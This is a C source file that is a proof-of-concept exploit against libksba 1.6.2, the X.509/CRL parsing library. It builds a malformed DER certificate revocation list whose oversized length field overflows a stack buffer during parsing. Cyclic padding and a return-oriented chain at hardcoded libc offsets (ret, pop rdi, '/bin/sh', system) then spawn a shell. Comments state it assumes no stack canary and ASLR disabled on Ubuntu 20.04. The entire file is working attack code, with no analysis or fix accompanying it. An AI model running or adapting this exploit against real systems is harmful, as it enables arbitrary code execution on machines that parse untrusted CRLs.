#include <stdio.h>
#include <string.h>
#include <ksba.h>

#define N (531+10+2143+8*4)

// exploit against libksba 1.6.2 (commit: ff8c0e8)
// libksba must have been compiled with no stack canary,
// and ASLR must be off
// tested against ubuntu 20.04

unsigned long ret = 0x007ffff7d83000 + 0x0019916a;
unsigned long pop_rdi = 0x007ffff7d83000 + 0x0019764d;
unsigned long system = 0x007ffff7d83000 + 0x52290;
unsigned long binsh = 0x007ffff7d83000 + 0x1b45bd;

int main() {
    ksba_crl_t crl;
    ksba_crl_new(&crl);

    ksba_reader_t reader;
    ksba_reader_new (&reader);

    char buffer[N] = "\x30\x82\x03\x14\x30\x82\x01\xfc\x02\x01\x01\x30\x0d\x06\x09\x2a\x86\x48\x86\xf7\x0d\x01\x01\x05\x05\x00\x30\x5f\x31\x23\x30\x21\x06\x03\x55\x04\x0a\x13\x1a\x53\x61\x6d\x70\x6c\x65\x20\x53\x69\x67\x6e\x65\x72\x20\x4f\x72\x67\x61\x6e\x69\x7a\x61\x74\x69\x6f\x6e\x31\x1b\x30\x19\x06\x03\x55\x04\x0b\x13\x12\x53\x61\x6d\x70\x6c\x65\x20\x53\x69\x67\x6e\x65\x72\x20\x55\x6e\x69\x74\x31\x1b\x30\x19\x06\x03\x55\x04\x03\x13\x12\x53\x61\x6d\x70\x6c\x65\x20\x53\x69\x67\x6e\x65\x72\x20\x43\x65\x72\x74\x17\x0d\x31\x33\x30\x32\x31\x38\x31\x30\x33\x32\x30\x30\x5a\x17\x0d\x31\x33\x30\x32\x31\x38\x31\x30\x34\x32\x30\x30\x5a\x30\x82\x01\x36\x30\x3c\x02\x03\x14\x79\x47\x17\x0d\x31\x33\x30\x32\x31\x38\x31\x30\x32\x32\x31\x32\x5a\x30\x26\x30\x0a\x06\x03\x55\x1d\x15\x04\x03\x0a\x01\x03\x30\x18\x06\x03\x55\x1d\x18\x04\x11\x18\x0f\x32\x30\x31\x33\x30\x32\x31\x38\x31\x30\x32\x32\x30\x30\x5a\x30\x3c\x02\x03\x14\x79\x48\x17\x0d\x31\x33\x30\x32\x31\x38\x31\x30\x32\x32\x32\x32\x5a\x30\x26\x30\x0a\x06\x03\x55\x1d\x15\x04\x03\x0a\x01\x06\x30\x18\x06\x03\x55\x1d\x18\x04\x11\x18\x0f\x32\x30\x31\x33\x30\x32\x31\x38\x31\x30\x32\x32\x30\x30\x5a\x30\x3c\x02\x03\x14\x79\x49\x17\x0d\x31\x33\x30\x32\x31\x38\x31\x30\x32\x32\x33\x32\x5a\x30\x26\x30\x0a\x06\x03\x55\x1d\x15\x04\x03\x0a\x01\x04\x30\x18\x06\x03\x55\x1d\x18\x04\x11\x18\x0f\x32\x30\x31\x33\x30\x32\x31\x38\x31\x30\x32\x32\x30\x30\x5a\x30\x3c\x02\x03\x14\x79\x4a\x17\x0d\x31\x33\x30\x32\x31\x38\x31\x30\x32\x32\x34\x32\x5a\x30\x26\x30\x0a\x06\x03\x55\x1d\x15\x04\x03\x0a\x01\x01\x30\x18\x06\x03\x55\x1d\x18\x04\x11\x18\x0f\x32\x30\x31\x33\x30\x32\x31\x38\x31\x30\x32\x32\x30\x30\x5a\x30\x3c\x02\x03\x14\x79\x4b\x17\x0d\x31\x33\x30\x32\x31\x38\x31\x30\x32\x32\x35\x31\x5a\x30\x26\x30\x0a\x06\x03\x55\x1d\x15\x04\x03\x0a\x01\x05\x30\x18\x06\x03\x55\x1d\x18\x04\x11\x18\x0f\x32\x30\x31\x33\x30\x32\x31\x38\x31\x30\x32\x32\x30\x30\x5a\xa0\x2f\x30\x2d\x30\x1f\x06\x03\x55\x1d\x23\x04\x18\x30\x16\x80\x14\xbe\x12\x01\xcc\xaa\xea\x11\x80\xda\x2e\xad\xb2\xea\xc7\xb5\xfb\x9f\xf9\xad\x34\x30\x0a\x06\x03\x55\x1d\x14\x04\x03\x02\x01\x03\x30\x0d\x06\x09\x2a\x86\x48\x86\xf7\x0d\x01\x01\x05\x05\x00" "\x03\x88\xff\xff\xff\xff\xff\xff\xff\xf0" "aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaaezaafbaafcaafdaafeaaffaafgaafhaafiaafjaafkaaflaafmaafnaafoaafpaafqaafraafsaaftaafuaafvaafwaafxaafyaafzaagbaagcaagdaageaagfaaggaaghaagiaagjaagkaaglaagmaagnaagoaagpaagqaagraagsaagtaaguaagvaagwaagxaagyaagzaahbaahcaahdaaheaahfaahgaahhaahiaahjaahkaahlaahmaahnaahoaahpaahqaahraahsaahtaahuaahvaahwaahxaahyaahzaaibaaicaaidaaieaaifaaigaaihaaiiaaijaaikaailaaimaainaaioaaipaaiqaairaaisaaitaaiuaaivaaiwaaixaaiyaaizaajbaajcaajdaajeaajfaajgaajhaajiaajjaajkaajlaajmaajnaajoaajpaajqaajraajsaajtaajuaajvaajwaajxaajyaajzaakbaakcaakdaakeaakfaakgaakhaakiaakjaakkaaklaakmaaknaakoaakpaakqaakraaksaaktaakuaakvaakwaakxaakyaakzaalbaalcaaldaaleaalfaalgaalhaaliaaljaalkaallaalmaalnaaloaalpaalqaalraalsaaltaaluaalvaalwaalxaalyaalzaambaamcaamdaameaamfaamgaamhaamiaamjaamkaamlaammaamnaamoaampaamqaamraamsaamtaamuaamvaamwaamxaamyaamzaanbaancaandaaneaanfaangaanhaaniaanjaankaanlaanmaannaanoaanpaanqaanraansaantaanuaanvaanwaanxaanyaanzaaobaaocaaodaaoeaaofaaogaaohaaoiaaojaaokaaolaaomaaonaaooaaopaaoqaaoraaosaaotaaouaaovaaowaaoxaaoyaaozaapbaapcaapdaapeaapfaapgaaphaapiaapjaapkaaplaapmaapnaapoaappaapqaapraapsaaptaapuaapvaapwaapxaapyaapzaaqbaaqcaaqdaaqeaaqfaaqgaaqhaaqiaaqjaaqkaaqlaaqmaaqnaaqoaaqpaaqqaaqraaqsaaqtaaquaaqvaaqwaaqxaaqyaaqzaarbaarcaardaareaarfaargaarhaariaarjaarkaarlaarmaarnaaroaarpaarqaarraarsaartaaruaarvaarwaarxaaryaarzaasbaascaasdaaseaasfaasgaashaasiaasjaaskaaslaasmaasnaasoaaspaasqaasraassaastaasuaasvaaswaasxaasyaaszaatbaatcaatdaateaatfaatgaathaatiaatjaatkaatlaatmaatnaatoaatpaatqaatraatsaattaatuaatvaatwaatxaatyaatzaaubaaucaaudaaueaaufaaugaauhaauiaaujaaukaaulaaumaaunaauoaaupaauqaauraausaautaauuaauvaauwaauxaauyaauzaavbaavcaavdaaveaavfaavgaavhaaviaavjaavkaa";
    *(unsigned long*)(buffer+N-8*4) = (unsigned long)ret;
    *(unsigned long*)(buffer+N-8*3) = (unsigned long)pop_rdi;
    *(unsigned long*)(buffer+N-8*2) = (unsigned long)binsh;
    *(unsigned long*)(buffer+N-8*1) = (unsigned long)system;
    ksba_reader_set_mem (reader, buffer, N);
    ksba_crl_set_reader(crl, reader);

    ksba_stop_reason_t stop_reason;
    do {
        ksba_crl_parse(crl, &stop_reason);
        printf("%d\n", stop_reason);
    } while(stop_reason != KSBA_SR_READY);
}
